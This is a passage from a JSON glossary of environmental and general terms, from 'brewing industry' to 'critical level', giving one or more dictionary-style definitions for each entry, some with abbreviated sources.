industry\": [\"A sector of the economy in which an aggregate of commercial enterprises is engaged in the manufacture and marketing of beverages made from malt and hops by steeping, boiling and fermentation, such as beer, ale and other related beverages.\"], \"brick\": [\"A building material usually made from clay, molded as a rectangular block, and baked or burned in a kiln.\"], \"bridge\": [\"A structure that spans and provides a passage over a road, railway, river, or some other obstacle.\", \"A system which connects two or more local area networks at layer 2.\", \"To be or make bridge over something.\", \"The ridge of the nose running from the root of the nose down to the tip.\", \"An elevated platform above the upper deck of a mechanically propelled ship from which it is navigated.\", \"A wrestling move performed from a supine position, lying down face-up.\"], \"bromine\": [\"A pungent dark red volatile liquid element (symbol Br, atomic number 35) of the halogen series that occurs in brine and is used in the production of chemicals.\"], \"brooding\": [\"Incubating eggs by sitting on them.\"], \"brook\": [\"A small stream or rivulet, commonly swiftly flowing in rugged terrain, of lesser length and volume than a creek; especially a stream that issues directly from the ground, as from a spring or seep, or that is produced by heavy rainfall or melting snow.\", \"To allow (something that one dislikes or disagrees with) to continue to exist or occur without interference; accept or undergo, often unwillingly.\"], \"bryophyte\": [\"Any plant of the division Bryophyta, having stems and leaves but lacking true vascular tissue and roots and reproducing by spores: includes the mosses and liverworts.\"], \"budget\": [\"A balance sheet or statement of estimated receipts and expenditures.\"], \"bug\": [\"Any of the suborder Heteroptera, having piercing and sucking mouthparts, specialized as a beak.\\\\n(Source: CED)\", \"A problem in computer software or hardware or in electronic hardware in general.\", \"To make someone rather angry or impatient; to cause annoyance.\", \"Any insect, arachnid, or other terrestrial arthropod that is a pest.\"], \"building\": [\"Structure with a roof and walls, such as a house or factory.\", \"The process of constructing.\"], \"building area\": [\"Land and other places on, under, in or through which the temporary and permanent works are to be executed and any other lands or places needed for the purposes of construction.\\\\n(Source: ECHO1)\"], \"building component\": [\"A building element which uses industrial products that are manufactured as independent until capable of being joined with other elements.\"], \"building land\": [\"Area of land suitable for building on.\"], \"building material\": [\"Any material used in construction, such as steel, concrete, brick, masonry, glass, wood, etc.\"], \"building planning\": [\"The activity of designing, organizing or preparing for future construction or reconstruction of edifices and facilities.\\\\n(Source: RHW)\"], \"building site\": [\"A piece of land on which a house or other building is being built.\"], \"building technology\": [\"The application of engineering principles and technology to building design and construction.\"], \"built environment\": [\"That part of the physical surroundings which are people-made or people-organized, such as buildings and other major structures, roads, bridges and the like, down to lesser objects such as traffic lights, telephone and pillar boxes.\"], \"built-up area\": [\"Area which is full of houses, shops, offices and other buildings, with very little open space.\", \"The area within a city or town, as indicated by appropriate traffic signs (or, in the United Kingdom, by the presence of street lights), where different traffic rules are in effect, such as a reduction of the speed limit.\"], \"bulb cultivation\": [\"The cultivation of flower bulb is divided into two sectors: for forcing (flower bulbs used by professional growers for the production of cut flowers and potted plants) and for dry sales (flower bulbs for garden planting, flower pots, landscaping and parks).\\\\n(Source: BULB)\"], \"bus\": [\"A large, long-bodied motor vehicle equipped with seating for passengers, usually operating as part of a scheduled service.\"], \"business\": [\"The activity, position or site associated with commerce or the earning of a livelihood.\", \"Commercial, industrial or financial activity.\"], \"butterfly\": [\"A lepidopteran that is active at day.\"], \"button-cell battery\": [\"A tiny, circular battery made for a watch or for other microelectric applications.\"], \"by-catch\": [\"Fish that is caught unintentionally while intending to catch other fish and that is often discarded back into the sea.\"], \"by-product\": [\"A product from a manufacturing process that is not considered the principal material.\"], \"cable\": [\"Strands of insulated electrical conductors laid together, usually around a central core, and wrapped in a heavy insulation.\", \"To send a message by telegraph.\"], \"cadmium\": [\"Chemical element with symbol Cd and atomic number 48, silvery gray transition metal.\"], \"cadmium contamination\": [\"The release and presence in the air, water and soil of cadmium, a toxic, metallic element, from sources such as the burning of coal and tobacco and improper disposal of cadmium-containing waste.\\\\n(Source: FFD / EEN)\"], \"calcium\": [\"A malleable silvery-white metallic element of the alkaline earth group with symbol Ca and atomic number 20; the fifth most abundant element in the earth crust, occurring especially as forms of calcium carbonate. It is an essential constituent of bones and teeth and is used as a deoxidizer in steel.\\\\n(Source: CED)\"], \"calcium content\": [\"Amount of calcium contained in a solution.\"], \"calibration\": [\"The marking the scale of a measuring instrument so that readings can be made in appropriate units.\"], \"canal\": [\"An artificial open waterway used for transportation, waterpower, or irrigation.\"], \"cancer\": [\"Any malignant cellular tumour including carcinoma and sarcoma.\"], \"cancer risk\": [\"The probability that exposure to some agent or substance will adversely transform cells to replicate and form a malignant tumor.\"], \"car\": [\"A four-wheeled motor vehicle used for land transport.\"], \"carbohydrate\": [\"Any of the group of organic compounds composed of carbon, hydrogen and oxygen, including sugars, starches and celluloses.\"], \"carbon\": [\"A nonmetallic element with symbol C and atomic number 6 existing in the three crystalline forms: graphite, diamond and buckminsterfullerene: occurring in carbon dioxide, coal, oil and all organic compounds.\\\\n(Source: CED)\"], \"carbonate\": [\"A salt or ester of carbonic acid.\\\\n(Source: CED)\"], \"carbon cycle\": [\"The cycle of carbon in the biosphere, in which plants convert carbon dioxide to organic compounds that are consumed by plants and animals, and the carbon is returned to the biosphere in inorganic form by processes of respiration and decay.\\\\n(Source: MGH)\"], \"carbon dioxide\": [\"A colourless gas with a faint tingling smell and taste.\"], \"carbon dioxide tax\": [\"Compulsory charges levied on fuels to reduce the output of carbon dioxide (CO2).\"], \"carbon monoxide\": [\"Chemical formula CO; a colorless, odorless, and tasteless gas.\"], \"carcinogenicity\": [\"The ability or tendency of a substance or physical agent to cause or produce cancer.\"], \"carcinogenicity test\": [\"Test for assessing if a chemical or physical agent increases the risk of cancer.\"], \"carcinogen\": [\"A substance that causes cancer in humans and animals.\", \"Causing cancer.\"], \"cardiology\": [\"The branch of medicine that studies the heart.\"], \"cardiovascular disease\": [\"The class of diseases that involve the heart or blood vessels (arteries and veins).\"], \"carnivore\": [\"An animal that eats meat.\"], \"cartography\": [\"The making of maps and charts for the purpose of visualizing spatial distributions over various areas of the earth.\"], \"cash crop\": [\"Crops that are grown for sale in the town markets or for export. They include coffee, cocoa, sugar, vegetables, peanuts and non-foods, like tobacco and cotton.\"], \"catalysis\": [\"A phenomenon in which a relatively small amount of substance augments the rate of a chemical reaction without itself being consumed.\\\\n(Source: MGH)\"], \"catalyst\": [\"A substance whose presence alters the rate at which a chemical reaction proceeds, but whose own composition remains unchanged by the reaction. Catalysts are usually employed to accelerate reactions(positive catalyst), but retarding (negative) catalysts are also used.\\\\n(Source: ALL)\", \"A substance which speeds up chemical reactions.\"], \"catalytic converter\": [\"A device designed to clean up the exhaust fumes from petrol-driven vehicles.\"], \"catastrophe\": [\"A sudden, widespread disaster or calamity that greatly exceeds the resources of an area or region.\", \"A sudden violent change in the earth's surface.\"], \"catchment area\": [\"An area from which surface runoff is carried away by a single drainage system.\"], \"cation\": [\"A positively charged atom or group of atoms, or a radical which moves to the negative pole (cathode) during electrolysis.\\\\n(Source: MGH)\"], \"cattle\": [\"Domesticated bovine animals, including cows, steers and bulls, raised and bred on a ranch or farm.\"], \"cave\": [\"1) An underground hollow with access from the ground surface or from the sea, often found in limestone areas and on rocky coastlines.\\\\n2) A natural cavity, chamber or recess which leads beneath the surface of the earth, generally in a horizontal or obliquely inclined direction. It may be in the form of a passage or a gallery, its shape depending in part on the joint pattern or structure of the rock and partly on the type of process involved in its excavation. Thus, caves worn by subterranean rivers may be different in character from, and of considerably greater extent than, a sea-cave eroded by marine waves.\\\\n3) A natural underground open space, generally with a connection to the surface and large enough for a person to enter. The most common type of cave is formed in a limestone by dissolution.\\\\n(Source: CED /  WHIT /  BJGEO)\"], \"cellulose\": [\"The main polysaccharide in living plants, forming the skeletal structure of the plant cell wall; a polymer of beta-D-glucose linked together with the elimination of water to form chains of 2000-4000 units.\"], \"cement\": [\"A dry powder made from silica, alumina, lime, iron oxide, and magnesia which hardens when mixed with water; used as an ingredient in concrete.\"], \"Central Africa\": [\"A geographic region of the African continent close to the equator that includes Cameroon, Chad, Equatorial Guinea, Gabon, the Central African Republic and the Democratic Republic of Congo.\"], \"Central America\": [\"A narrow continental region of the Western hemisphere, existing as a bridge between North and South America, often considered to be the southern portion of North America, and including countries such as Guatemala, Belize, El Salvador, Honduras, Nicaragua, Costa Rica and Panama.\"], \"Central Asia\": [\"A geographic region of the Asian continent between the Caspian Sea on the west and China on the east, extending northward into the central region of Russia and southward to the northern borders of Iran and Afghanistan, and comprised of independent former republics of the Soviet Union, including Kazakstan, Uzbekistan, Turkmenistan, Kyrgyzstan and Tajikistan.\"], \"central government\": [\"A system in which a governing or administrative body has a certain degree of power or authority to prevail in the management of local, national and international matters.\"], \"centrifugation\": [\"Separation of particles from a suspension in a centrifuge: balanced tubes containing the suspension are attached to the opposite ends of arms rotating rapidly about a central point; the suspended particles are forced outwards, and collect at the bottoms of the tubes.\\\\n(Source: UVAROV)\"], \"cephalopod\": [\"Exclusively marine animals constituting the most advanced class of the Mollusca, including squid, octopuses, and Nautilus.\\\\n(Source: MGH)\"], \"ceramics\": [\"The art and techniques of producing articles of clay, porcelain, etc.\"], \"ceramics industry\": [\"Industry producing ceramic items.\"], \"cetacean\": [\"Order of aquatic mammals, including the whales, dolphins, and porpoises.\"], \"Chagas' disease\": [\"A form of trypanosomiasis found in South America, caused by the protozoan Trypanosoma cruzi, characterized by fever and often inflammation of the hearth muscle.\\\\n(Source: CED)\"], \"chain management\": [\"The administration, organization and planning for the flow of materials or merchandise through various stages of production and distribution, involving a network of vendors, suppliers, manufacturers, distributors, retailers and other trading partners.\\\\n(Source: MSE)\"], \"charcoal\": [\"A porous solid product containing 85-98% carbon and produced by heating carbonaceous materials such as cellulose, wood or peat at 500-600 C\\u00b0 in the absence of air.\\\\n(Source: MGH)\"], \"chelicerate\": [\"A subphylum of the phylum Artrophoda; chelicerae are characteristically modified as pincers.\"], \"chemical analysis\": [\"The complex of operations aiming to determine the kinds of constituents of a given substance.\\\\n(Source: ZINZAN)\"], \"chemical engineering\": [\"The branch of engineering concerned with industrial manufacture of chemical products.\"], \"chemical industry\": [\"The industry that comprises the companies that produce industrial chemicals.\"], \"chemical oceanography\": [\"The study of the behavior of the chemical elements within the Earth's oceans.\"], \"chemical plant\": [\"Plants where basic raw materials are chemically converted into a variety of products.\"], \"chemical property\": [\"Property of a substance depending on the arrangement of the atoms in the molecule, e.g. bio-availability, degradability, persistence, etc.\\\\n(Source: RRDA)\"], \"chemical reaction\": [\"A change in which a substance is transformed into one or more new substances.\"], \"chemical\": [\"Any substance used in or resulting from a reaction involving changes to atoms or molecules.\", \"Of or relating to chemistry.\"], \"chemical structure\": [\"The arrangement of atoms in a molecule of a chemical compound.\"], \"chemical treatment\": [\"A process that alters the chemical structure of the constituents of the waste to produce either an innocuous or a less hazardous material. Chemical processes are attractive because they produce minimal air emissions, they can often be carried out on the site of the waste generator, and some processes can be designed and constructed as mobile units.\\\\n(Source: PARCOR)\"], \"chemical waste\": [\"Any by-product of a chemical process, including manufacturing processes. Often this by-product is considered a toxic or polluting substance.\\\\n(Source: APD / ERG)\"], \"chemical weapon\": [\"Chemical agents of warfare including all gaseous, liquid or solid chemical substances which might be employed because of their direct toxic effects on man and animals.\"], \"chemisorption\": [\"The process of chemical adsorption.\"], \"chemistry\": [\"The scientific study of the properties, composition, and structure of matter, the changes in structure and composition of matter, and accompanying energy changes.\"], \"child\": [\"Living being as genetically proceeding from an other one.\", \"A person below the age of puberty.\", \"An entity that is narrower in scope.\"], \"chimney\": [\"A vertical structure of brick, masonry, or steel that carries smoke or steam away from a fire, engine, etc.\"], \"chiropteran\": [\"Order of placental mammals, comprising the bats, having the front limbs modified as wings.\"], \"chloride\": [\"A compound which is derived from hydrochloric acid and contains the chlorine atom in the -1 oxidation state.\\\\n(Source: MGH)\"], \"chlorinated hydrocarbon\": [\"A class of persistent, broad-spectrum insecticides that linger in the environment and accumulate in the food chain. Among them are DDT, aldrin, dieldrin, heptachlor, chlordane, lindane, endrin, mirex, hexachloride, and toxaphene. In insects and other animals these compounds act primarily on the central nervous system. They also become concentrated in the fats of organisms and thus tend to produce fatty infiltration of the heart and fatty degeneration of the liver in vertebrates. In fishes they have the effect of preventing oxygen uptake, causing suffocation. They are also known to slow the rate of photosynthesis in plants. Their danger to the ecosystem resides in their rate stability and the fact that they are broad-spectrum poisons which are very mobile because of their propensity to stick to dust particles and evaporate with water into the atmosphere.\\\\n(Source: EPAGLO /  PORT)\"], \"chlorination\": [\"The application of chlorine to water, sewage or industrial wastes for disinfection or other biological or chemical purposes.\\\\n(Source: ALL)\"], \"chlorine\": [\"A very reactive and highly toxic green, gaseous element, belonging to the halogen family of substances with symbol Cl and atomic number 17.\"], \"chloroethylene\": [\"A flammable, explosive gas with an ethereal aroma; soluble in alcohol and ether, slightly soluble in water; boils at -14\\u00b0 C; an important monomer for polyvinyl chloride and its copolymers; used in organic synthesis and in adhesives.\"], \"chlorofluorocarbon\": [\"Gases formed of chlorine, fluorine, and carbon whose molecules normally do not react with other substances; they are therefore used as spray can propellants because they do not alter the material being sprayed.\"], \"partially halogenated chlorofluorohydrocarbon\": [\"Hydrocarbons whose hydrogen atoms have been partially substituted with chlorine and fluorine. They are used in refrigeration, air conditioning, packaging, insulation, or as solvents and aerosol propellants. Because they are not destroyed in the lower atmosphere they drift into the upper atmosphere where their chlorine components destroy ozone.\"], \"chlorophenol\": [\"Any organochloride of phenol that contains one or more covalently bonded chlorine atoms.\"], \"chlorophyll\": [\"A green pigment, present in algae and higher plants, that absorbs light energy and thus plays a vital role in photosynthesis.\"], \"chlorosis\": [\"A disease condition of green plants seen as yellowing of green parts of the plants.\\\\n(Source: MGH)\"], \"chromatography\": [\"A method of separating and analyzing mixtures of chemical substances by selective adsorption in a column of powder or on a strip of paper.\"], \"chromium\": [\"A hard grey metallic element that takes a high polish, occurring principally in chromite: used in steel alloys and electroplating to increase hardness and corrosion-resistance.\"], \"chrysophyta\": [\"The golden-brown and orange-yellow algae; a diverse group of microscopically small algae which inhabit fresh and salt water, many being planktonic. They contain carotenoid pigments and may be unicellular, colonial, filamentous or amoeboid.\"], \"church\": [\"A building where Christian religious activities take place.\"], \"city\": [\"Term used generically today to denote any urban form but applied particularly to large urban settlements. There are, however, no agreed definitions to separate a city from the large metropolis or the smaller town.\"], \"civil air traffic\": [\"Air traffic pertaining to or serving the general public, as distinguished from military air traffic.\"], \"civil engineering\": [\"The planning, design, construction, and maintenance of fixed structures and ground facilities for industry, transportation, use and control of water or occupancy.\"], \"civilian protection\": [\"The organization and measures, usually under governmental or other authority depending on the country, aimed at preventing, abating or fighting major emergencies for the protection of the civilian population and property, particularly in wartime.\"], \"civil law\": [\"The body of law dealing with the private relations between members of a community.\"], \"classification\": [\"An arrangement or organization of persons, items or data elements into groups by reason of common attributes, characteristics, qualities or traits.\"], \"clay\": [\"A loose, earthy, extremely fine-grained, natural sediment or soft rock composed primarily of clay-size or colloidal particles and characterized by high plasticity and by a considerable content of clay mineral and subordinate amounts of finely divided quartz, decomposed feldspar, carbonates, ferruginous matter, and other impurities; it forms a plastic, moldable mass when finely ground and mixed with water, retains its shape on drying, and becomes firm, rocklike and permanently hard on heating or firing.\", \"The physical structure of a dead animal or person.\"], \"clean technology\": [\"Industrial process which causes little or no pollution.\"], \"climate\": [\"The average weather condition in a region of the world.\"], \"climate protection\": [\"Precautionary actions, procedures or installations undertaken to prevent or reduce harm from pollution to natural weather conditions or patterns, including the prevailing temperature, atmospheric composition and precipitation.\"], \"climate type\": [\"Weather conditions typical of areas roughly corresponding to lines of latitude.\"], \"climatic alteration\": [\"The slow variation of climatic characteristics over time at a given place. This may be indicated by the geological record in the long term, by changes in the landforms in the intermediate term, and by vegetation changes in the short term.\\\\n(Source: WHIT)\"], \"climatic change\": [\"The long-term fluctuations in temperature, precipitation, wind, and all other aspects of the Earth's climate.\"], \"climatic zone\": [\"A belt of the earth's surface within which the climate is generally homogeneous in some respect.\"], \"climatology\": [\"That branch of meteorology concerned with the mean physical state of the atmosphere together with its statistical variations in both space and time as reflected in the weather behaviour over a period of many years.\"], \"climax\": [\"A botanical term referring to the terminal community said to be achieved when a sere (a sequential development of a plant community or group of plant communities on the same site over a period of time) achieves dynamic equilibrium with its environment and in particular with its prevailing climate. Each of the world's major vegetation climaxes is equivalent to a biome. Many botanists believe that climate is the master factor in a plant environment and that even if several types of plant succession occur in an area they will all tend to converge towards a climax form of vegetation.\\\\n(Source: WHIT)\", \"To reach a sexual climax; to experience orgasm.\", \"The moment of most intense feeling and pleasure during sexual activity.\"], \"clinical symptom\": [\"Any objective evidence of disease or of a patient's condition founded on clinical observation.\\\\n(Source: RRDA)\"], \"cloning\": [\"The production of genetically identical individuals from a single parent.\"], \"clothing\": [\"Clothes considered as a group.\", \"All coverings designed to be worn on a person's body.\"], \"cloud\": [\"Suspensions of minute water droplets or ice crystals produced by the condensation of water vapour.\", \"To cover with clouds.\"], \"coagulation\": [\"A separation or precipitation from a dispersed state of suspended particles resulting from their growth.\"], \"coal\": [\"The natural, rocklike, brown to black derivative of forest-type plant material, usually accumulated in peat beds and progressively compressed and indurated until it is finally altered in to graphite-like material.\"], \"coal-fired power plant\": [\"Power plant which is fuelled by coal.\"], \"coal gasification\": [\"Process of conversion of coal to a gaseous product which is used as fuel in electric power stations.\"], \"coal liquefaction\": [\"The process of preparing a liquid mixture of hydrocarbons by destructive distillation of coal.\\\\n(Source: MGH)\"], \"coal mining\": [\"The technical and mechanical job of removing coal from the earth and preparing it for market.\"], \"coal refining\": [\"The processing of coal to remove impurities.\"], \"coal technology\": [\"The processing of coal to make gaseous and liquid fuels.\\\\n(Source: ENVAR)\"], \"coast\": [\"A line or zone where the land meets the sea or some other large expanse of water.\"], \"coastal erosion\": [\"The gradual wearing away of material from a coast by the action of sea water.\"], \"coastal fishing\": [\"Fishing in an area of the sea next to the shoreline.\\\\n(Source: PHC)\"], \"coastal water\": [\"The part of the ocean directly off the coast.\"], \"coastguard\": [\"A maritime force which aids shipping, saves lives at sea, prevents smuggling, etc.\"], \"coating\": [\"A material applied onto or impregnated into a substrate for protective, decorative, or functional purposes. Such materials include, but are not limited to, paints, varnishes, sealers, adhesives, thinners, diluents, and inks.\"], \"cobalt\": [\"A metallic element with symbol Co and atomic number 27, used chiefly in alloys.\"], \"cockroach\": [\"The most primitive of the living winged insects.\"], \"code\": [\"A systematic collection, compendium or revision of laws, rules, or regulations.\", \"To enter a program or other instructions into a computer (or other electronic device) to instruct it to do a particular task.\"], \"coelenterate\": [\"Animals that have a single body cavity (the coelenteron).\"], \"co-incineration\": [\"Joint incineration of hazardous waste, in any form, with refuse and/or sludge.\\\\n(Source: LEE)\"], \"coke\": [\"A coherent, cellular, solid residue remaining from the dry distillation of a coking coal or of pitch, petroleum, petroleum residue, or other carbonaceous materials; contains carbon as its principal constituent.\\\\n(Source: MGH)\", \"A street name for cocaine.\"], \"cold\": [\"A condition of low temperature.\", \"Having a low temperature.\", \"A contagious, viral infectious disease of the upper respiratory system; common symptoms include cough, sore throat, runny nose, nasal congestion and sneezing.\", \"Psychologically distant; without human warmth or emotion.\", \"(color) giving no sensation of warmth.\", \"Sexually unresponsive.\", \"Without compunction or human feeling.\"], \"coliform bacterium\": [\"A group of bacteria that are normally abundant in the intestinal tracts of human and other warm-blooded animals and are used as indicators (being measured as the number of individuals found per millilitre of water) when testing the sanitary quality of water.\"], \"colloid\": [\"An intimate mixture of two substances, one of which, called the dispersed phase, is uniformly distributed in a finely divided state through the second substance, called the dispersion medium.\"], \"colloidal state\": [\"A system of particles in a dispersion medium, with properties distinct from those of a true solution because of the larger size of the particles. The presence of these particles can often be detected by means of the ultramicroscope.\\\\n(Source: UVAROV)\"], \"colour\": [\"An attribute of things that results from the light they reflect, transmit, or emit in so far as this light causes a visual sensation that depends on its wavelengths.\", \"To add color to.\"], \"combination effect\": [\"A combined effect of two or more substances or organisms which is greater than the sum of the individual effect of each.\"], \"combined cycle-power station\": [\"This type of plant is flexible in response and can be built in the 100-600 MW capacity range. It produces electrical power from both a gas turbine (ca. 1300\\u00b0C gas inlet temperature), fuelled by natural gas or oil plus a steam turbine supplied with the steam generated by the 500\\u00b0C exhaust gases from the gas turbine. The thermal efficiency of these stations is ca. 50 per cent compared with a maximum of 40 per cent from steam turbine coal fired power stations. This type of plant can be built in two years compared with six years for a coal-fired station and 10-15 years for nuclear.\\\\n(Source: PORT)\"], \"combustibility\": [\"The property of a substance of being capable of igniting and burning.\"], \"combustion engine\": [\"An engine that operates by the energy of combustion of a fuel.\"], \"commercial law\": [\"The whole body of substantive jurisprudence applicable to the rights, intercourse and relations of persons engaged in commerce, trade or mercantile pursuits.\"], \"commercial traffic\": [\"The operations and movements related to the transportation and exchange of goods.\\\\n(Source: RRDA)\"], \"commercial vehicle\": [\"Vehicle designed and equipped for the transportation of goods.\"], \"communications\": [\"The concept, science, technique and process of transmitting, receiving or otherwise exchanging information and data.\"], \"community-pays principle\": [\"A tenet of environmental policy, according to which the costs of ecological challenges, environmental quality improvements and the removal of environmental hazards are allotted to community groups or local corporations and, thereby, to the general public.\"], \"commuter traffic\": [\"Traffic caused by people travelling regularly over some distance, as between a suburb and a city and back, between their place of residence and their place of work.\"], \"commuting\": [\"Traveling from one's residence to one's regular place of business and back to the residence.\"], \"compaction\": [\"Reduction of the bulk of solid waste by rolling and tamping.\"], \"company policy\": [\"Official guidelines or set of guidelines adopted by a company for the management of its activity.\"], \"comparative law\": [\"The study of the principles of legal science by the comparison of various systems of law.\\\\n(Source: BLACK)\"], \"comparative test\": [\"A test conducted to determine whether one procedure is better than another.\"], \"comparison\": [\"The placing together or juxtaposing of two or more items to ascertain, bring into relief, or establish their similarities and dissimilarities.\"], \"compensation\": [\"Equivalent in money for a loss sustained; equivalent given for property taken or for an injury done to another; recompense or reward for some loss, injury or service.\\\\n(Source: WESTS)\"], \"economic competition\": [\"The market condition where an individual or firm that wants to buy or sell a commodity or service has a choice of possible suppliers or customers.\"], \"competitiveness\": [\"The ability of a firm to strive in the market with rivals in the production and sale of commodities or services and, analogously, the ability of a country to maintain a relatively high standard of living for its citizens through trade in international markets.\\\\n(Source: http://www.indiana.edu/~ipe/glossry.html / OED)\"], \"complex formation\": [\"Formation of a complex compound. Also known as complexing or complexation.\"], \"complexing agent\": [\"A substance capable of forming a complex compound with another material in solution.\"], \"compost\": [\"A mixture of decaying organic matter used to fertilize and condition the soil.\"], \"composting\": [\"The natural biological decomposition of organic material in the presence of air to form a humus-like material.\"], \"compression\": [\"Reduction in the volume of a substance due to pressure.\\\\n(Source: MGH)\", \"A condition in which the volume of fuel and air in an engine cylinder is reduced as a result of increased pressure by a piston.\", \"The system of forces that tend to decrease the volume of or shorten rocks.\", \"Any of several techniques that reduce the number of bits required to represent information in data transmission or storage.\"], \"compressor\": [\"A device that produces pressure.\"], \"European Communities\": [\"The collective body that resulted in 1967 from the merger of the administrative networks of the European Atomic Energy Community (EURATOM), the European Coal and Steel Community (ECSC), and the European Economic Community (EEC). The singular term has also been widely used.\\\\n(Source: ABDN)\"], \"concrete\": [\"A mixture of aggregate, water, and a binder, usually Portland cement; it hardens to stonelike condition when dry.\", \"To build using concrete; to cover with cement.\", \"Not abstract.\", \"Particular, perceivable, real.\"], \"conductivity\": [\"The ratio of the electric current density to the electric field in a material.\"], \"congress\": [\"A formal meeting, often consisting of representatives of various organizations, that is assembled to promote, discuss or make arrangements regarding a particular subject or some matter of common interest.\"], \"conifer\": [\"An order of conebearing plants which includes nearly all the present day Gymnospermae. Most are tall evergreen trees with needle-like (e.g., pines), linear (e.g. firs) or scale-like (e.g., cedars) leaves. They are characteristic of temperate zones and the main forest trees of colder regions. They provide timber, resins, tars, turpentine and pulp for paper.\\\\n(Source: ALL)\"], \"conservation\": [\"The protection of a natural resource, usually by planned management, to prevent its depletion or destruction.\"], \"constitutional law\": [\"That branch of the public law of a nation or state which treats of the organization, powers and frame of government, the distribution of political and governmental authorities and functions, the fundamental principles which are to regulate the relations of government and citizen and which prescribes generally the plan and method according to which the public affairs of the nation or state are to be administered.\", \"A law in a country's constitution.\"], \"construction work\": [\"The construction, rehabilitation, alteration, conversion, extension, demolition or repair of buildings, highways, or other changes or improvement to real property, including facilities providing utility services.\"], \"consultation\": [\"Any meeting or inquiry of concerned persons or advisors for the purpose of deliberation, discussion or decision on some matter or action.\\\\n(Source: BLD)\"], \"consumer group\": [\"A collection of persons united to address concerns regarding the purchase and use of specific commodities or services.\\\\n(Source: RHW)\"], \"consumer protection\": [\"Information disseminated or measures and programs established to prevent and reduce damage, injury or loss to users of specific commodities and services.\\\\n(Source: RHW)\"], \"consumption\": [\"Spending for survival or enjoyment in contrast to providing for future use or production.\", \"A common and deadly infectious disease that is caused by mycobacteria, primarily Mycobacterium tuberculosis.\"], \"container\": [\"A large case that can be transported by truck and than easily loaded on a ship.\"], \"contaminated soil\": [\"Soil which because of its previous or current use has substances under, on or in it which, depending upon their concentration and/or quantity, may represent a direct potential or indirect hazard to man or to the environment.\\\\n(Source: GRAHAW)\"], \"contamination\": [\"Introduction into or onto water, air, soil or other media of microorganisms, chemicals, toxic substances, wastes, wastewater or other pollutants in a concentration that makes the medium unfit for its next intended use.\"], \"continental shelf\": [\"The gently sloping seabed of the shallow water nearest to a continent, covering about 45 miles from the shore and deepening over the sloping sea floor to an average depth of 400 ft.\"], \"contour farming\": [\"The performing of cultivations along lines connecting points of equal elevation so reducing the loss of top soil by erosion, increasing the capacity of the soil to retain water and reducing the pollution of water by soil.\"], \"contract\": [\"An agreement between two or more persons which creates an obligation to do or not to do a particular thing. Its essential are competent parties, subject matter, a legal consideration, mutuality of agreement, and mutuality of obligation.\", \"An agreement with which a person or a company are engaged towards another person or company to deliver a good or a service in exchange for a predetermined payment.\", \"To reduce in width or extent.\", \"To acquire or catch (a disease, something noxious, bad condition).\"], \"contract cleaner\": [\"A commercial service provider, usually bound by a written agreement, responsible for the removal of dirt, litter or other unsightly materials from any property.\\\\n(Source: RHW)\"], \"controlled burning\": [\"The planned use of carefully controlled fire to accomplish predetermined management goals. The burn is set under a combination of weather, fuel moisture, soil moisture, and fuel arrangement conditions that allow the management objectives to be attained, and yet confine the fire to the planned area.\\\\n(Source: DUNSTE)\"], \"controlling authority\": [\"The power of a person or an organized assemblage of persons to manage, direct, superintend, restrict, regulate, govern, administer or oversee.\\\\n(Source: BLD)\"], \"convention\": [\"International agreement on a specific topic.\", \"The preferred method of accomplishing a task.\", \"A large formal assembly.\"], \"conventional energy\": [\"Power provided by traditional means such as coal, wood, gas, etc., as opposed to alternative energy sources such as solar power, tidal power, wind power, etc.\"], \"cooling\": [\"A decrease in temperature.\", \"A mechanism for keeping something cool.\", \"Causing cold or cooling.\"], \"cooling oil\": [\"Oil used as a cooling agent, either with forced circulation or with natural circulation.\"], \"cooling tower\": [\"A device that aids in heat removal from water used as a coolant in electric power generating plants.\"], \"cooling water\": [\"Water used to make something less hot, such as the irradiated elements from a nuclear reactor or the engine of a machine.\"], \"copper\": [\"Chemical element with symbol Cu and atomic number 29; one of the most important nonferrous metals; a ductile and malleable metal found in various ores and used in industry, engineering, and the arts in both pure and alloyed form.\"], \"coppice\": [\"A growth of small trees that are repeatedly cut down at short intervals; the new shoots are produced by the old stumps.\"], \"coral\": [\"The skeleton of certain solitary and colonial anthozoan coelenterates; composed chiefly of calcium carbonate.\"], \"coral reef\": [\"Underwater structures built up from the skeletons of reef-building coral a small primitive marine animal, and other marine animals and algae over thousands of years.\"], \"core meltdown\": [\"Accidental overheating of the core of a nuclear reactor resulting in the core melting and radiation escaping.\"], \"cork\": [\"The thick light porous outer bark of the cork oak, used widely as an insulator and for stoppers for bottles, casks, etc.\", \"Conical or cylindrical-shaped plug that is pushed in the bottleneck of a (wine) bottle to stop it up.\"], \"corridor\": [\"A narrow hall or passage with rooms leading off it.\"], \"corrosion\": [\"A process in which a solid, especially a metal, is eaten away and changed by a chemical action.\"], \"corrosion inhibitor\": [\"A chemical agent which slows down or prohibits a corrosion reaction.\"], \"cosmetic industry\": [\"Industry for the production of substances for improving the appearance of the body.\"], \"cosmic radiation\": [\"Radiations consisting of atomic nuclei, especially protons, of very high energy that reach the earth from outer space. Some cosmic radiations are very energetic and are able to penetrate a mile or more into the Earth.\"], \"cost-benefit analysis\": [\"The attempt to assess, compare and frequently justify the total price or loss represented by a certain activity or expenditure with the advantage or service it provides.\"], \"cost increase\": [\"The augmentation or rise in the amount of money incurred or asked for in the exchange of goods and services.\"], \"cost recovery basis\": [\"A standard used to provide reimbursement to individuals or organizations for any incurred expense or provided service.\"], \"cost\": [\"In economics, the value of the factors of production used by a firm in producing or distributing goods and services or engaging in both activities.\\\\n(Source: GREENW)\", \"The amount of money paid per unit for a good or service.\", \"To be priced at.\", \"To require to lose, suffer, or sacrifice.\"], \"cotton\": [\"Fiber obtained from plants of the genus Gossypium, used in making fabrics, cordage, and padding and for producing artificial fibers and cellulose.\", \"A shrub of the genus Gossypium known for the soft fibers that protect its seeds.\"], \"county\": [\"An area comprising more than one city and whose boundaries have been designed according to some biological, political, administrative, economic, demographic criteria.\", \"The land under the jurisdiction of a count.\"], \"court of justice\": [\"A tribunal having jurisdiction of appeal and review, including the ability to overturn decisions of lower courts or courts of first instance.\\\\n(Source: BLD)\"], \"covering\": [\"Structure or material that covers an edifice.\", \"Something put around something else, usually in order to give it another look or to protect it from its environment.\"], \"craft\": [\"An occupation or trade requiring manual dexterity or skilled artistry.\", \"The skilled practice of a practical occupation.\"], \"credit assistance\": [\"The help and support from banks and other financial institutions in providing money or goods without requiring present payment.\\\\n(Source: ISEP /  OED)\"], \"criminality\": [\"A violation of the law, punishable by the State in criminal proceedings.\"], \"criminal law\": [\"That body of the law that deals with conduct considered so harmful to society as a whole that it is prohibited by statute, prosecuted and punished by the government.\\\\n(Source: DUHA)\"], \"critical level\": [\"The concentration limit beyond which a substance can cause dangerous effects to living organisms.\\\\n(Source: 